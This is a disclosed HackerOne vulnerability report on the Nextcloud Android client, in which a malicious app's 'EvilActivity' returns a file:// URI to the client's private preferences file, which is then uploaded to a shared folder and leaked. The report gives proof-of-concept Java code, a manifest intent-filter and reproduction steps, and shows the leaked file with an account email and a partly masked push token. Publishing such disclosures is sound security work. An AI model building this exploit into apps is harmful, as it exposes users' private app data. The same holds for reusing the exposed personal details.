# Leak arbitrary file under nextcloud android client privacy directory

## Report Details
- **Report ID**: 1142918
- **URL**: https://hackerone.com/reports/1142918
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2021-03-31T08:24:06.359Z
- **Disclosed**: 2021-07-17T10:32:36.300Z

## Reporter
- **Username**: wester0x01
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nextcloud

## Vulnerability Information
Steps to reproduce:

1.install and login nextcloud android client 
2.create a directory and set it 'shareable'
3.install the poc app "setresultcontactphotocrop"

key code:

`EvilActivity`
```
public class EvilActivity extends AppCompatActivity {
    final static String PRIVATE_URI = "file:///data/data/com.nextcloud.client/shared_prefs/com.nextcloud.client_preferences.xml";

    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Log.d("heen", "EvilActivity started!");
        setResult(-1, new Intent().setData(Uri.parse(PRIVATE_URI)));
        finish();
    }
}
```
`manifest.xml->intent-filter`
```
  <activity android:name=".EvilActivity" >
            <intent-filter>
                <action android:name="android.intent.action.GET_CONTENT"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="android.intent.category.OPENABLE"/>
                <data android:mimeType="*/*"/>
            </intent-filter>
        </activity>
```

4.Take into the shareable diretory in the step2, and click '+', choose "upload content from other apps"

5.if the victim click the poc app by accident, the secret file "/data/data/com.nextcloud.client/shared_prefs/com.nextcloud.client_preferences.xml" will be publicly shared and leaked.


com.nextcloud.client_preferences.xml content
```
<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <boolean name="keysMigration" value="true" />
    <string name="select_oc_account">yunbeitai2015@126.com@efss.qloud.my</string>
    <boolean name="autoUploadPathUpdate" value="true" />
    <boolean name="autoUploadInit" value="true" />
    <float name="grid_columns" value="3.0" />
    <string name="storage_path">/storage/emulated/0/Android/media/com.nextcloud.client</string>
    <boolean name="legacyClean" value="true" />
    <boolean name="storagePathFix" value="true" />
    <boolean name="autoUploadEntriesSplitOut" value="true" />
    <int name="lastSeenVersionCode" value="30150190" />
    <boolean name="keysReinit" value="true" />
    <string name="pushToken">dsqXrhNrS0aKvlblvQirA5:APA91bFsXrXQAy****StWaRswHJJG39zx5rAMX_yrjsSQD23fJnFNkro9hxwSZmwbufEn_M0IEPhGwGgMJ29WCfNmGlem6teT6qXHZQW3GY57tk9CbVmjb5kiSjHBqF6OUTI6b0WAzQI</string>
</map>
```

## Impact

arbitrary sensitive file under nextcloud android client privacy directory /data/data/com.nextcloud.client leaked
{F1249064}

## Attachments
- poc_nextcloud.jpg
